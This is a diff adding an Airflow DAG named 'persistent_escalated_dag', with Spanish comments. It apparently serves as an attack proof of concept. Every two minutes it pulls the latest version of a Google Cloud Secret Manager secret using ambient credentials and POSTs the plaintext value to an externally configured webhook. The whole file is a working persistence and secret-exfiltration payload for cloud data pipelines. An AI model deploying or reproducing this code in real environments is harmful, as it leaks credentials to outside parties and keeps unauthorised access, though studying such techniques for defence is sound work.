@@ -1,0 +1,69 @@
+from airflow import DAG
+from airflow.operators.python import PythonOperator
+from airflow.models import Variable
+from datetime import datetime, timedelta
+import os, logging, requests
+
+def post_secret_to_webhook():
+    # 1) Webhook (Airflow Var o env)
+    webhook = os.environ.get("WEBHOOK_URL") or Variable.get("WEBHOOK_URL", default_var=None)
+    secret_name = os.environ.get("SECRET_NAME") or Variable.get("SECRET_NAME", default_var="test-secret")
+
+    if not webhook or not webhook.startswith(("http://", "https://")):
+        logging.warning("[!] WEBHOOK_URL no está definido o es inválido.")
+        return
+
+    # 2) Project ID (por defecto via google.auth, con fallback a env/Variable)
+    try:
+        import google.auth
+        credentials, project_id = google.auth.default()
+    except Exception:
+        project_id = None
+
+    project_id = project_id or os.environ.get("GOOGLE_CLOUD_PROJECT") \
+                 or os.environ.get("GCP_PROJECT") \
+                 or Variable.get("GCP_PROJECT", default_var=None)
+
+    if not project_id:
+        logging.warning("[!] No se pudo resolver el Project ID.")
+        return
+
+    # 3) Acceso al secreto y POST
+    try:
+        from google.cloud import secretmanager
+    except Exception as e:
+        logging.warning(f"[!] Falta dependencia google-cloud-secret-manager: {e}")
+        return
+
+    try:
+        client = secretmanager.SecretManagerServiceClient()
+        name = f"projects/{project_id}/secrets/{secret_name}/versions/latest"
+        value = client.access_secret_version(name=name).payload.data.decode("utf-8")
+        logging.warning(f"[*] Secreto recuperado ({secret_name}, len={len(value)}). Enviando al webhook…")
+        r = requests.post(webhook, json={"secret": value, "src": "demo-dag"})
+        logging.warning(f"[*] Webhook status: {r.status_code}")
+    except Exception as e:
+        logging.warning(f"[!] Error recuperando/enviando secreto: {e}")
+        raise
+
+default_args = {
+    "owner": "airflow",
+    "retries": 0,
+    "depends_on_past": False,
+}
+
+with DAG(
+    dag_id="persistent_escalated_dag",
+    start_date=datetime(2023, 1, 1),
+    schedule="*/2 * * * *",
+    catchup=False,
+    default_args=default_args,
+    max_active_runs=1,
+    dagrun_timeout=timedelta(minutes=10),
+    tags=["demo","secret-post"],
+) as dag:
+    PythonOperator(
+        task_id="post_secret_to_webhook",
+        python_callable=post_secret_to_webhook,
+        do_xcom_push=False,
+    )
